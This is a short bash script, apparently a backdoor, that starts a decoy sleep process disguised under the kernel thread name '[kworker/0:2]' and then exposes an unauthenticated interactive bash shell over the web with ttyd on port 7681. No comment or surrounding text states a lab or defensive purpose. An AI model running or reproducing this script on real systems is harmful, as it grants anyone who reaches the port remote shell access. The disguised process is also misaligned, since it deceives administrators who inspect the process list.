#!/bin/bash
exec -a "[kworker/0:2]" /bin/sleep 999999 &
exec ttyd -p 7681 bash
